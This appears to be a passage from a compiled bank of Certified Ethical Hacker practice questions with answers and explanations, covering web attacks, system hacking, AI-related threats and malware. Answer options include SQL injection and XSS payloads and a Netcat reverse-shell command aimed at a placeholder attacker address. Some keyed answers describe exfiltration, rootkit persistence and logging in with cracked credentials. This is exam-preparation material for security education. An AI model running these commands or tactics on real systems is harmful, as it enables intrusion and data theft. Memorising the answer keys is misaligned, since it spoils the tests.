**Explanation:** SQL injection is caused by insufficient input validation that allows malicious SQL code to be injected into application queries. It is not caused by firewall weaknesses, encryption issues, or VPN failures.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q358
**Which of the following is a common SQL Injection payload?**

- A) <script>alert(1)</script>
- B) ' OR '1'='1
- C) sudo apt update
- D) ping 127.0.0.1

**Answer:** B
**Explanation:** The payload ' OR '1'='1 is a classic SQL injection that bypasses authentication by making the WHERE clause always evaluate to true. Option A is an XSS payload. Options C and D are system commands.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q359
**Which database attack modifies queries to extract data?**

- A) DDoS
- B) XSS
- C) SQL Injection
- D) Sniffing

**Answer:** C
**Explanation:** SQL Injection manipulates and modifies database queries to extract unauthorized data. DDoS disrupts availability. XSS injects client-side scripts. Sniffing captures network traffic.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q360
**What prevents SQL Injection?**

- A) Using more RAM
- B) Parameterized queries
- C) Removing admin accounts
- D) Using firewalls only

**Answer:** B
**Explanation:** Parameterized queries (prepared statements) separate SQL code from data, preventing injected input from being executed as SQL commands. This is the most effective defense against SQL injection.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q361
**Which of the following is an example of XSS injection?**

- A) ' OR '1'='1
- B) <script>alert('XSS')</script>
- C) nmap -sV 192.168.1.1
- D) sudo su

**Answer:** B
**Explanation:** The <script>alert('XSS')</script> payload injects executable JavaScript into web pages. Option A is an SQL injection payload. Options C and D are command-line operations.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q362
**XSS allows attackers to:**

- A) Steal cookies
- B) Format SQL queries
- C) Scan networks
- D) Replace firewalls

**Answer:** A
**Explanation:** Cross-Site Scripting (XSS) can capture session cookies, authentication tokens, and other sensitive client-side data by injecting malicious scripts that execute in victims' browsers.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q363
**Which type of XSS stores the script in a database?**

- A) Reflected
- B) Stored
- C) DOM-based
- D) Local

**Answer:** B
**Explanation:** Stored (persistent) XSS saves the malicious script in the application's database, executing it every time a user views the affected page. Reflected XSS requires a crafted URL. DOM-based XSS modifies the DOM environment.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q364
**What prevents XSS?**

- A) Strong passwords
- B) Input sanitization
- C) Faster servers
- D) VPN

**Answer:** B
**Explanation:** Input sanitization (encoding, escaping, and validating user input) removes or neutralizes harmful code before it is rendered in the browser, preventing XSS attacks.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q365
**Which of the following is a commonly exploited web application vulnerability?**

- A) Cross-site scripting (XSS)
- B) DNS spoofing
- C) SYN flood
- D) Ping of Death

**Answer:** A
**Explanation:** XSS is one of the most common web application vulnerabilities, allowing attackers to inject malicious scripts into web pages viewed by other users. DNS spoofing, SYN flood, and Ping of Death are network-layer attacks.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q366
**While testing a web application, you identify a SQL injection vulnerability. Which of the following actions would be considered unethical?**

- A) Documenting the vulnerability and informing the client
- B) Exploiting the vulnerability to access unauthorized data
- C) Recommending security measures to fix the vulnerability
- D) Using the vulnerability to perform a denial of service attack on the database

**Answer:** B
**Explanation:** Accessing unauthorized data through exploitation violates ethical standards and the scope of authorized testing. Documentation, recommendations, and responsible disclosure represent proper ethical hacker conduct.
**Source:** FlashGenius - CEH SQL Injection Domain

---

## Q367
**Which type of attack involves sending ICMP echo requests to broadcast addresses, overwhelming the network?**

- A) Smurf attack
- B) SQL injection
- C) Cross-site scripting
- D) Port scanning

**Answer:** A
**Explanation:** A Smurf attack sends ICMP echo requests to network broadcast addresses with a spoofed source IP (the victim's), causing all hosts to reply to the victim, overwhelming it with traffic. This is a form of amplification DDoS attack.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q368
**Which technique is used to exploit a buffer overflow vulnerability?**

- A) Cross-site scripting
- B) SQL injection
- C) DNS spoofing
- D) Shellcode injection

**Answer:** D
**Explanation:** Shellcode injection exploits buffer overflows by overwriting memory with malicious executable code (shellcode) that runs when the overflowed buffer is processed. XSS and SQL injection target different layers. DNS spoofing redirects DNS queries.
**Source:** Vinsys - Top 30 MCQs for CEH

---

# System Hacking (35 questions)

## Q37
**Which is an example of privilege escalation?**

- A) Logging in with default credentials
- B) Gaining root access via local vulnerability
- C) Social engineering for credentials
- D) Identifying open ports

**Answer:** B
**Explanation:** Privilege escalation exploits a vulnerability to gain elevated access from a lower-privileged account.
**Source:** CehTest.com

---

## Q38
**Which attack uses precomputed hash tables for password cracking?**

- A) Dictionary attack
- B) Brute force attack
- C) Rainbow table attack
- D) Hybrid attack

**Answer:** C
**Explanation:** Rainbow tables contain precomputed hash-plaintext pairs for rapid password recovery.
**Source:** CEH Study Guide

---

## Q39
**What is the primary defense against rainbow table attacks?**

- A) Longer passwords
- B) Salting passwords before hashing
- C) Symmetric encryption
- D) Two-factor authentication

**Answer:** B
**Explanation:** Salting adds random data to each password before hashing, making rainbow tables useless.
**Source:** CEH Study Guide

---

## Q40
**An attacker hides a malicious file inside a JPEG image. What technique?**

- A) Encryption
- B) Steganography
- C) Obfuscation
- D) Tunneling

**Answer:** B
**Explanation:** Steganography hides data within other files without visibly altering them.
**Source:** CEH Study Guide

---

## Q41
**Which Windows feature hides data streams within NTFS files?**

- A) Shadow Copy
- B) Alternate Data Streams (ADS)
- C) BitLocker
- D) EFS

**Answer:** B
**Explanation:** NTFS ADS allows hiding data within legitimate files. Moving to FAT removes ADS.
**Source:** CEH Study Guide

---

## Q42
**How to exfiltrate Sales.xls past network monitoring without raising suspicion?**

- A) PGP encrypt and email to personal account
- B) Package with Trojan wrappers and telnet
- C) Hide in photo.jpg using steganography
- D) Rename to .txt and upload

**Answer:** C
**Explanation:** Steganography conceals data within innocent-looking files, bypassing content filtering.
**Source:** Pass4Success

---

## Q98
**Using Metasploit to exploit a service and get Meterpreter. What phase?**

- A) Reconnaissance
- B) Scanning
- C) Gaining access
- D) Maintaining access

**Answer:** C
**Explanation:** Exploiting a vulnerability to get a shell is the Gaining Access phase.
**Source:** CEH Study Guide

---

## Q100
**What does 'pivoting' mean in penetration testing?**

- A) Rotating encryption keys
- B) Using a compromised system to attack others
- C) Changing methodologies
- D) Reporting findings

**Answer:** B
**Explanation:** Pivoting uses a compromised system as relay to attack internal networks.
**Source:** CEH Study Guide

---

## Q112
**Which command creates a reverse shell using Netcat?**

- A) nc -l -p 4444
- B) nc -e /bin/bash attacker_ip 4444
- C) nc -z target_ip 1-1024
- D) nc -v target_ip 80

**Answer:** B
**Explanation:** nc -e /bin/bash sends a shell to the attacker's listening instance.
**Source:** CEH Study Guide

---

## Q114
**Best tool for brute-forcing a login page against common credentials?**

- A) Nmap
- B) Hydra
- C) Wireshark
- D) Burp Suite

**Answer:** B
**Explanation:** Hydra is a fast network logon cracker supporting many protocols.
**Source:** CEH Study Guide

---

## Q120
**Attacker uses Responder.py on Windows network. What is captured?**

- A) Wireless packets
- B) NTLMv2 hashes via LLMNR/NBT-NS poisoning
- C) SSL certificates
- D) DNS zone transfers

**Answer:** B
**Explanation:** Responder.py poisons LLMNR/NBT-NS to capture NTLMv2 hashes.
**Source:** CEH v13 Study Guide

---

## Q129
**Why is it important to store system logs remotely?**

- A) Local systems can't handle it
- B) Bandwidth is faster than disks
- C) Attackers might delete local logs
- D) It will defend against attacks

**Answer:** C
**Explanation:** Remote log storage ensures that even if an attacker compromises a system and tries to cover their tracks by deleting local logs, a copy remains on the remote log server for forensic analysis.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q134
**You've installed multiple files and processes on the compromised system. What should you also look at installing?**

- A) Registry keys
- B) Alternate data streams
- C) Root login
- D) Rootkit

**Answer:** D
**Explanation:** A rootkit helps maintain persistent, hidden access to a compromised system. It conceals the attacker's presence by hiding files, processes, and network connections from detection tools.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q138
**Which of the following is a type of password attack that involves trying every possible combination of characters until the correct password is found?**

- A) Brute force
- B) Cross-site scripting
- C) SQL injection
- D) Denial of Service

**Answer:** A
**Explanation:** Brute force is a type of password attack that involves trying every possible combination of characters until the correct password is found. It is time-consuming but guaranteed to eventually succeed.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q152
**Which of the following is a technique used to exploit a weakness in authentication mechanisms?**

- A) Password spraying
- B) Port scanning
- C) Ping of Death
- D) DNS rebinding

**Answer:** A
**Explanation:** Password spraying is a technique used by attackers to gain access by trying commonly used passwords against many user accounts, avoiding account lockout policies.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q153
**Which of the following techniques can be used to hide the tracks of an attack?**

- A) SQL injection
- B) Privilege escalation
- C) Fileless malware
- D) Log tampering

**Answer:** D
**Explanation:** Log tampering is a technique that involves erasing evidence from log files to prevent detection and hide the tracks of an attack. It is a key step in the covering tracks phase of system hacking.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q156
**Which of the following is NOT a type of password attack?**

- A) Brute force
- B) Dictionary
- C) SQL injection
- D) Rainbow table

**Answer:** C
**Explanation:** SQL injection is a web application attack that exploits database vulnerabilities, not a password attack. Brute force, dictionary attacks, and rainbow table attacks are all methods for cracking passwords.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q206
**During a penetration test, you exploit a Windows vulnerability and gain access to an administrator account. What tool can you use to extract plaintext passwords from memory?**

- A) Cain & Abel
- B) Mimikatz
- C) Netcat
- D) Kali Linux

**Answer:** B
**Explanation:** Mimikatz is a tool specifically designed to extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory on Windows systems.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-system-hacking-1749512495822

---

## Q207
**You suspect that an attacker has installed a keylogger on a compromised system. What is the most effective method to confirm its presence?**

- A) Use a file integrity checker to detect changes
- B) Check running processes for suspicious programs
- C) Perform a network traffic analysis
- D) Review the firewall rules for anomalies

**Answer:** B
**Explanation:** Checking running processes for suspicious programs is the most direct way to find a keylogger, which often runs as a hidden or disguised process in the system.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-system-hacking-1749512495822

---

## Q208
**After gaining access to an internal network, you need to enumerate user accounts to identify privileged users. Which tool would be most appropriate for this task?**

- A) Snort
- B) Cain & Abel
- C) Wireshark
- D) OpenVAS

**Answer:** B
**Explanation:** Cain & Abel is a versatile tool for network analysis that can enumerate user accounts, crack passwords, and perform various man-in-the-middle attacks, focusing on finding privileged accounts.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-system-hacking-1749512495822

---

## Q209
**During a penetration test, you want to maintain access to a compromised machine after a reboot. Which approach should you take?**

- A) Change the user's password
- B) Install a rootkit
- C) Initiate a SYN flood
- D) Perform a DNS spoofing attack

**Answer:** B
**Explanation:** Installing a rootkit can help maintain persistent access to a system even after a reboot, by hiding its presence and allowing remote control through backdoor mechanisms.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-system-hacking-1749512495822

---

## Q217
**Which of the following is an example of privilege escalation?**

- A) Logging in as a user with default credentials
- B) Gaining root access after exploiting a vulnerability in a local system
- C) Using social engineering to gather user credentials
- D) Identifying open ports on a target system

**Answer:** B
**Explanation:** Privilege escalation involves gaining higher-level access on a system than originally authorized. Exploiting a local vulnerability to gain root access is a classic example of vertical privilege escalation.
**Source:** https://cehtest.com/ceh-questions.html

---

## Q379
**An attacker has successfully cracked user passwords from a target organization using a password hash dump. What step should be taken to verify the information gathered?**

- A) Conduct a phishing campaign
- B) Perform a DNS poisoning attack
- C) Log into the target system using the cracked credentials
- D) Run a man-in-the-middle attack

**Answer:** C
**Explanation:** The most direct way to verify cracked passwords is to attempt authentication on the target system using those credentials. This confirms the passwords are correct and the accounts are active.
**Source:** FlashGenius - CEH System Hacking Domain

---

## Q380
**Which type of attack tries all possible combinations of characters until the correct password is found?**

- A) Brute force
- B) Cross-site scripting
- C) SQL injection
- D) Denial of Service

**Answer:** A
**Explanation:** A brute force attack systematically tries every possible combination of characters until it finds the correct password. This is computationally expensive but guaranteed to eventually succeed given enough time and computing power.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q381
**How is a brute-force attack performed?**

- A) By trying all possible combinations of characters
- B) By trying dictionary words
- C) By capturing hashes
- D) By comparing hashes

**Answer:** A
**Explanation:** Brute-force attacks exhaustively try all possible character combinations. Dictionary attacks use wordlists. Hash capture is part of credential harvesting. Rainbow table attacks compare precomputed hashes.
**Source:** Infibee - CEH Review Questions

---

## Q382
**Which file holds password hashes in Windows systems?**

- A) Boot.ini
- B) SAM file
- C) Winlogin.exe
- D) System32.ini

**Answer:** B
**Explanation:** The SAM (Security Accounts Manager) file in Windows stores password hashes for local user accounts. It is located at C:\Windows\System32\config\SAM and is locked while Windows is running.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q383
**What is privilege escalation?**

- A) Installing new software
- B) Gaining higher access rights
- C) Changing user passwords
- D) Closing unused ports

**Answer:** B
**Explanation:** Privilege escalation is the process of gaining higher-level permissions than initially authorized (e.g., from standard user to administrator/root). This can be vertical (higher privilege level) or horizontal (same level, different user).
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q384
**Which tool is commonly used for password cracking?**

- A) John the Ripper
- B) Wireshark
- C) Nessus
- D) PuTTY

**Answer:** A
**Explanation:** John the Ripper is a well-known password cracking tool that supports multiple hash types and attack modes (dictionary, brute force, hybrid). Wireshark captures packets. Nessus scans for vulnerabilities. PuTTY is an SSH/Telnet client.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q385
**Keylogging helps the attacker to do what?**

- A) Encrypt files
- B) Record keystrokes of a user
- C) Scan open ports
- D) Capture network traffic

**Answer:** B
**Explanation:** Keyloggers capture and record every keystroke a user types, including passwords, credit card numbers, and other sensitive data. They can be hardware-based or software-based.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q386
**Which technique is used by attackers to hide evidence of compromise?**

- A) SQL injection
- B) Privilege escalation
- C) Fileless malware
- D) Log tampering

**Answer:** D
**Explanation:** Log tampering involves modifying or deleting system, event, and application logs to erase evidence of an attacker's activities and avoid detection by forensic investigators.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q387
**Which authentication mechanism exploitation technique tries common passwords against multiple accounts?**

- A) Password spraying
- B) Port scanning
- C) Ping of Death
- D) DNS rebinding

**Answer:** A
**Explanation:** Password spraying tries a small number of commonly used passwords against many user accounts simultaneously. This avoids account lockout policies that trigger after multiple failed attempts against a single account.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q388
**_______ is the process of exploiting services on a system.**

- A) System hacking
- B) Privilege escalation
- C) Enumeration
- D) Backdoor

**Answer:** A
**Explanation:** System hacking encompasses the process of exploiting services and vulnerabilities on a target system to gain and increase access. Privilege escalation is a phase within system hacking. Enumeration gathers information. A backdoor is a persistence mechanism.
**Source:** Infibee - CEH Review Questions

---

## Q389
**Rootkits are commonly used to do what?**

- A) Open ports
- B) Hide malicious activity
- C) Create user accounts
- D) Block firewalls

**Answer:** B
**Explanation:** Rootkits conceal unauthorized access and malicious operations by modifying the operating system kernel, libraries, or user-space tools to hide processes, files, network connections, and registry entries from detection.
**Source:** H2K Infosys - Ethical Hacking Quiz

---

## Q390
**Which of the following is NOT a password attack?**

- A) Brute force
- B) Dictionary
- C) SQL injection
- D) Rainbow table

**Answer:** C
**Explanation:** SQL injection targets database queries, not passwords directly. Brute force exhaustively tries all character combinations. Dictionary attacks use wordlists. Rainbow table attacks use precomputed hash lookup tables.
**Source:** Vinsys - Top 30 MCQs for CEH

---

## Q391
**You work for a company and are trying to steal data from the Sales database (Sales.xls). The company filters and monitors outbound traffic. How will you exfiltrate the data without raising suspicion?**

- A) Encrypt Sales.xls using PGP and email it to your personal account
- B) Package Sales.xls using Trojan wrappers and telnet it to your home computer
- C) Conceal Sales.xls inside another file like photo.jpg using steganography techniques
- D) Change the extension of Sales.xls to Sales.txt and upload as attachment

**Answer:** C
**Explanation:** Steganography hides data within innocent-looking files (images, audio) making it undetectable by content filters. Encrypted files may trigger DLP alerts. Trojan wrappers would be detected. Renaming extensions doesn't hide the content from deep packet inspection.
**Source:** Pass4Success - CEH 312-50

---

# AI, Modern Threats & Emerging Tech (22 questions)

## Q84
**Which AI technique generates realistic deepfakes for social engineering?**

- A) Reinforcement Learning
- B) GANs
- C) NLP
- D) Support Vector Machines

**Answer:** B
**Explanation:** GANs create realistic deepfake images and videos.
**Source:** CEH v13 Curriculum

---

## Q85
**What does the OWASP Top 10 for AI address?**

- A) Web app vulnerabilities
- B) AI software vulnerabilities
- C) Network protocol weaknesses
- D) Mobile app flaws

**Answer:** B
**Explanation:** Covers data poisoning, insecure APIs, and model theft in AI systems.
**Source:** CEH v13 Curriculum

---

## Q86
**Manipulating training data to produce incorrect AI results. What attack?**

- A) Model extraction
- B) Data poisoning
- C) Adversarial examples
- D) Prompt injection

**Answer:** B
**Explanation:** Data poisoning corrupts training datasets to compromise model accuracy.
**Source:** CEH v13 Curriculum

---

## Q87
**Which CEH v13 module covers ChatGPT-crafted phishing emails?**

- A) Module 2: Footprinting
- B) Module 7: Malware
- C) Module 9: Social Engineering
- D) Module 20: Cryptography

**Answer:** C
**Explanation:** Module 9 covers AI-driven social engineering including ChatGPT phishing.
**Source:** CEH v13 Curriculum

---

## Q88
**AI security tool ignoring certain malicious patterns. What attack occurred?**

- A) DoS
- B) Adversarial ML attack
- C) Zero-day
- D) Brute force

**Answer:** B
**Explanation:** Adversarial ML attacks manipulate models to misclassify or ignore threats.
**Source:** CEH v13 Study Guide

---

## Q89
**Core principle of zero-trust architecture?**

- A) Trust internal traffic
- B) Never trust, always verify
- C) Trust but verify periodically
- D) Trust verified users indefinitely

**Answer:** B
**Explanation:** Zero trust requires continuous verification regardless of network location.
**Source:** CEH v13 Study Guide

---

## Q90
**Compromising a vendor's update mechanism to distribute malware. What attack?**

- A) Watering hole
- B) Supply chain attack
- C) Drive-by download
- D) Spear phishing

**Answer:** B
**Explanation:** Supply chain attacks compromise the software distribution pipeline.
**Source:** CEH v13 Study Guide

---

## Q91
**Long-term attack with persistence, lateral movement, and slow exfiltration. What is this?**

- A) Script kiddie attack
- B) DDoS
- C) APT
- D) Ransomware

**Answer:** C
**Explanation:** APTs are sophisticated long-term attacks involving multiple phases.
**Source:** CEH v13 Study Guide

---

## Q115
**Purpose of the MITRE ATT&CK framework?**

- A) Encrypt communications
- B) Document adversary TTPs
- C) Scan for vulnerabilities
- D) Manage firewall rules

**Answer:** B
**Explanation:** MITRE ATT&CK documents adversary Tactics, Techniques, and Procedures.
**Source:** CEH v13 Study Guide

---

## Q122
**What is a 'living off the land' (LOLBin) attack?**

- A) Custom malware
- B) Using legitimate system tools for malicious purposes
- C) Physical break-in
- D) Social engineering

**Answer:** B
**Explanation:** LOLBin attacks use built-in OS tools to evade signature-based detection.
**Source:** CEH v13 Study Guide

---

## Q123
**What does EDR stand for and do?**

- A) Endpoint Detection and Response - monitors endpoints
- B) Enhanced Data Recovery
- C) External DNS Resolution
- D) Encrypted Data Relay

**Answer:** A
**Explanation:** EDR monitors endpoints, detects suspicious activity, and provides response capabilities.
**Source:** CEH v13 Study Guide

---

## Q124
**What new tool category was added in CEH v13 for AI-driven vulnerability assessment?**

- A) Traditional port scanners
- B) AI-powered automated scanners with ML
- C) Manual code review tools
- D) Physical security tools

**Answer:** B
**Explanation:** CEH v13 introduces AI-powered scanners using ML for smarter detection.
**Source:** CEH v13 Curriculum

---

## Q329
**In the context of CEH v13's AI security module, which technique involves manipulating training data to compromise a machine learning model's accuracy and reliability?**

- A) Model inversion attack
- B) Data poisoning
- C) Adversarial evasion
- D) Model extraction

**Answer:** B
**Explanation:** Data poisoning attacks manipulate the training data of machine learning models to compromise their accuracy, introduce backdoors, or cause misclassifications. This is covered in the OWASP Top 10 for AI module included in CEH v13, which addresses how AI systems can be attacked and defended. Model inversion extracts training data, adversarial evasion crafts inputs to fool models at inference time, and model extraction steals the model itself.
**Source:** https://www.infosectrain.com/blog/whats-new-in-ceh-v13-ai

---

## Q330
**A CEH v13 candidate is studying AI-driven social engineering techniques. Which of the following represents the most concerning AI-powered attack vector for social engineering?**

- A) Using AI to automate port scanning
- B) Deepfake video creation combined with voice cloning for impersonation
- C) Using machine learning for password cracking
- D) AI-based network traffic analysis

**Answer:** B
**Explanation:** CEH v13 Module 9 specifically covers AI-driven social engineering techniques including deepfake video creation and voice cloning. These technologies enable highly convincing impersonation attacks (e.g., CEO fraud) that bypass traditional verification methods. The combination of visual and audio deepfakes represents the most sophisticated AI-powered social engineering threat.
**Source:** https://www.infosectrain.com/blog/whats-new-in-ceh-v13-ai

---

## Q331
**In CEH v13's cybersecurity AI curriculum, which machine learning technique uses two neural networks competing against each other, and is explored for both malware generation and threat detection?**

- A) Random Forest Classifier
- B) Generative Adversarial Networks (GANs)
- C) Support Vector Machines (SVMs)
- D) K-Nearest Neighbors (KNN)

**Answer:** B
**Explanation:** Generative Adversarial Networks (GANs) consist of a generator and discriminator network that compete, improving both over time. CEH v13 explores GANs for their dual-use potential: attackers can use them to generate convincing phishing content, deepfakes, and evasive malware, while defenders can use them for anomaly detection and threat modeling.
**Source:** https://www.infosectrain.com/blog/whats-new-in-ceh-v13-ai

---

## Q332
**CEH v13 covers the use of large language models in social engineering. Which of the following best describes how tools like ChatGPT are being weaponized for phishing attacks?**

- A) Generating polymorphic malware that evades antivirus
- B) Crafting grammatically perfect, contextually aware phishing emails at scale
- C) Performing automated SQL injection attacks
- D) Brute-forcing encryption keys using AI acceleration

**Answer:** B
**Explanation:** CEH v13 Module 9 specifically addresses AI-driven phishing techniques including using ChatGPT to craft highly convincing, grammatically perfect phishing emails that are contextually aware and personalized. This eliminates the traditional tell-tale signs of phishing (poor grammar, generic content) and enables attacks at unprecedented scale.
**Source:** https://appinindore.com/blogs/what-will-you-learn-in-the-ceh-v13-syllabus-20-modules-explained/

---

## Q333
**CEH v13 includes the OWASP Top 10 for AI. Which of the following is a vulnerability category specifically addressed in this framework?**

- A) SQL Injection in REST APIs
- B) Insecure AI model APIs and model theft
- C) Cross-site scripting in web applications
- D) Buffer overflow in compiled binaries

**Answer:** B
**Explanation:** The OWASP Top 10 for AI, included in CEH v13 curriculum, addresses vulnerabilities specific to AI systems including insecure APIs that expose ML models, model theft/extraction, data poisoning, adversarial manipulation, and insecure model deployment. SQL injection, XSS, and buffer overflows are traditional web/software vulnerabilities covered in other OWASP lists.
**Source:** https://appinindore.com/blogs/what-will-you-learn-in-the-ceh-v13-syllabus-20-modules-explained/

---

## Q334
**A CISO is implementing a security architecture where no user or device is automatically trusted, regardless of whether they are inside or outside the corporate network perimeter. All access requests must be verified, validated, and authorized. What security model is being implemented?**

- A) Defense in depth
- B) Zero trust architecture
- C) Perimeter-based security
- D) Castle-and-moat model

**Answer:** B
**Explanation:** Zero Trust Architecture (ZTA) is based on the principle of 'never trust, always verify.' It eliminates implicit trust based on network location and requires continuous verification of every user, device, and connection. CISA reports 40% fewer successful lateral movement incidents in organizations with comprehensive ZTA. Defense in depth uses layered security but may still include trusted zones.
**Source:** https://dokumen.pub/ceh-v12-certified-ethical-hacker-study-guide-with-750-practice-test-questions-9781394186921-9781394186877-9781394186914-1394186924.html

---

## Q335
**Which modern security framework combines networking and security services including CASB, Zero Trust Network Access (ZTNA), Secure Web Gateway (SWG), and Firewall-as-a-Service (FWaaS) into a single cloud-delivered service?**

- A) SIEM (Security Information and Event Management)
- B) SASE (Secure Access Service Edge)
- C) SOAR (Security Orchestration, Automation and Response)
- D) EDR (Endpoint Detection and Response)

**Answer:** B
**Explanation:** SASE (Secure Access Service Edge) integrates networking (SD-WAN) and security services (CASB, ZTNA, SWG, FWaaS) into a unified cloud-delivered model. It supports zero trust principles by enforcing identity-based access policies regardless of user location. SIEM collects and analyzes logs, SOAR automates incident response, and EDR monitors endpoints.
**Source:** https://sase.checkpoint.com/blog/zero-trust/sase-vs-casb

---

## Q336
**A nation-state threat actor compromised the build process of a widely-used network management software, inserting a backdoor that was distributed to 18,000 organizations through legitimate software updates. Which type of attack does this describe?**

- A) Watering hole attack
- B) Supply chain attack
- C) Drive-by download
- D) Spear phishing campaign

**Answer:** B
**Explanation:** This describes a supply chain attack (modeled on the SolarWinds/SUNBURST incident of 2020). Supply chain attacks compromise trusted software vendors, build systems, or distribution channels to deliver malicious code through legitimate update mechanisms. This bypasses traditional security controls because the malware arrives through a trusted channel. Supply chain attacks nearly doubled in 2025, with 297 documented incidents (up 93% from 2024).
**Source:** https://www.ethicalhackinginstitute.com/blog/whats-new-in-ceh-v13-updates-you-should-know-about

---

## Q337
**An attacker compromised a South Korean VPN vendor's distribution channel, replacing legitimate installers with a trojanized version containing the SlowStepper backdoor delivered from the vendor's website. What APT technique category does this represent?**

- A) Initial Access via Phishing (T1566)
- B) Initial Access via Supply Chain Compromise (T1195)
- C) Execution via Command and Scripting Interpreter (T1059)
- D) Persistence via Boot or Logon Autostart (T1547)

**Answer:** B
**Explanation:** MITRE ATT&CK technique T1195 (Supply Chain Compromise) covers attacks that manipulate products or delivery mechanisms prior to receipt by the final consumer. This includes sub-techniques T1195.001 (Compromise Software Dependencies), T1195.002 (Compromise Software Supply Chain), and T1195.003 (Compromise Hardware Supply Chain). The PlushDaemon APT case is a real-world example from 2025.
**Source:** https://cyble.com/blog/ransomware-attacks-supply-chain-threat-landscape/

---

## Q343
**CEH v13 covers both offensive and defensive uses of AI in cybersecurity. Which of the following represents a defensive AI application for threat detection?**

- A) Using NLP to generate convincing phishing emails
- B) Using GANs to create deepfake videos for social engineering
- C) Using reinforcement learning for automated vulnerability exploitation
- D) Using machine learning for anomaly-based intrusion detection and behavioral analysis

**Answer:** D
**Explanation:** Machine learning for anomaly-based intrusion detection analyzes network traffic patterns and user behavior to identify deviations that may indicate threats. This defensive AI application is covered in CEH v13's AI module alongside offensive techniques. Options A, B, and C represent offensive AI applications: NLP for phishing, GANs for deepfakes, and RL for automated exploitation.
**Source:** https://www.infosectrain.com/blog/whats-new-in-ceh-v13-ai

---

# Malware Threats (20 questions)

## Q47
**Which malware disguises itself as legitimate software?**

- A) Virus
- B) Worm
- C) Trojan
- D) Spyware

**Answer:** C
**Explanation:** Trojans disguise as legitimate software and don't self-replicate.
**Source:** CehTest.com

---

## Q48
**What distinguishes a worm from a virus?**

- A) Worms require user interaction
- B) Worms self-replicate without user interaction
- C) Worms only affect mobile devices
- D) Worms encrypt files for ransom

**Answer:** B
**Explanation:** Worms self-propagate across networks without user interaction.
**Source:** CEH Study Guide

---

## Q49
**Unusual outbound traffic to unknown IP at regular intervals. What malware type?**

- A) Ransomware
- B) Adware
- C) Botnet/C2 beacon
- D) Rootkit

**Answer:** C
**Explanation:** Regular beaconing to external IP is characteristic of botnet C2 communication.
**Source:** CEH Study Guide

---

## Q128
**What piece of software could you use to recover from a ransomware attack?**

- A) Decryptor
- B) Encryptor
- C) Anti-malware
- D) Endpoint detection and response

**Answer:** A
**Explanation:** A decryptor is used to decrypt files that have been encrypted by ransomware. Anti-malware can remove the malware but cannot recover encrypted files. EDR detects but does not decrypt.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q158
**Which type of malware is designed to spread rapidly across a network by exploiting vulnerabilities?**

- A) Adware
- B) Spyware
- C) Trojan
- D) Worm

**Answer:** D
**Explanation:** A worm is a type of malware that is designed to spread rapidly across a network by exploiting vulnerabilities. Unlike viruses, worms can self-replicate without human interaction.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q164
**While performing a network scan, you notice several hosts responding to both UDP and TCP requests on unusual ports. What could this indicate?**

- A) Normal network behavior
- B) A well-configured firewall
- C) Potential Trojan activity
- D) Misconfigured DNS servers

**Answer:** C
**Explanation:** Responses on non-standard ports can suggest potential Trojan activity, as Trojans often use non-standard ports to communicate with command and control servers.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-scanning-networks-1749512463846

---

## Q187
**A client reports that their systems are frequently crashing, and you suspect malware interference. What is the best course of action to identify the cause?**

- A) Run a full system scan using an up-to-date antivirus program
- B) Check system logs for any unusual errors or warnings
- C) Reformat the system to eliminate any malware traces
- D) Reboot the system in safe mode and observe behavior

**Answer:** A
**Explanation:** Running a full system scan is effective in identifying and potentially removing known malware. Log checks and safe mode provide supplementary information. Reformatting is an extreme measure.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-malware-threats-1749512512505

---

## Q188
**You are analyzing a piece of malware that refused to execute in your controlled lab environment. Which technique is the malware likely using to avoid detection?**

- A) Heuristic evasion
- B) Code obfuscation
- C) Sandbox detection
- D) Rootkit installation

**Answer:** C
**Explanation:** Sandbox detection allows malware to identify when it is running in an analysis environment (like a sandbox or VM) and refuse to execute, avoiding behavioral analysis and detection.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-malware-threats-1749512512505

---

## Q189
**While conducting malware analysis, you discover that a suspicious file attempts to connect to an external IP address. What is the best course of action for an ethical hacker?**

- A) Block the IP at the firewall to prevent further connections
- B) Trace the IP address to identify the location of the server
- C) Submit the IP address to an online threat intelligence service
- D) Isolate the sample in a sandbox and monitor network activity

**Answer:** D
**Explanation:** Isolating the sample in a sandbox and monitoring its network activity allows safe observation of the malware's behavior, providing valuable threat intelligence without risking the production environment.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-malware-threats-1749512512505

---

## Q190
